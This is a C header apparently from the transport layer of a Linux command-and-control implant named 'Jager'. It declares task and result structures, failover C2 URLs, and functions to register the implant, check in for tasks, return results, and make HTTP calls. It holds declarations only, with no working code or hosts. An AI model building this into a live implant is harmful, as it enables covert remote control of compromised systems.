#ifndef JAGER_LINUX_TRANSPORT_H
#define JAGER_LINUX_TRANSPORT_H

#include "config.h"

typedef struct {
    BYTE  *data;
    DWORD  size;
    DWORD  status_code;
} HTTP_RESPONSE, *PHTTP_RESPONSE;

typedef struct {
    char   id[64];
    DWORD  type;
    BYTE  *data;
    DWORD  data_size;
} C2_TASK, *PC2_TASK;

typedef struct {
    char   task_id[64];
    BYTE  *data;
    DWORD  data_size;
    char   error[256];
} C2_RESULT, *PC2_RESULT;

#define MAX_C2_URLS 8

typedef struct {
    char urls[MAX_C2_URLS][512];
    int count;
    int current;
    int fail_count;
    int max_fails;
} C2_FAILOVER;

BOOL transport_init(PIMPLANT_CONFIG config);
BOOL transport_register(PIMPLANT_CONFIG config);
BOOL transport_checkin(PIMPLANT_CONFIG config, PC2_TASK *tasks, DWORD *task_count);
BOOL transport_send_result(PIMPLANT_CONFIG config, PC2_RESULT result);
void transport_cleanup(void);

PHTTP_RESPONSE http_post(const char *url, const char *path, const BYTE *data, DWORD data_size, const char *user_agent);
PHTTP_RESPONSE http_get(const char *url, const char *path, const char *user_agent);
void http_response_free(PHTTP_RESPONSE resp);

void failover_init(C2_FAILOVER *fo, const char *url_list);
const char *failover_get_url(C2_FAILOVER *fo);
void failover_mark_success(C2_FAILOVER *fo);
void failover_mark_failure(C2_FAILOVER *fo);

#endif /* JAGER_LINUX_TRANSPORT_H */
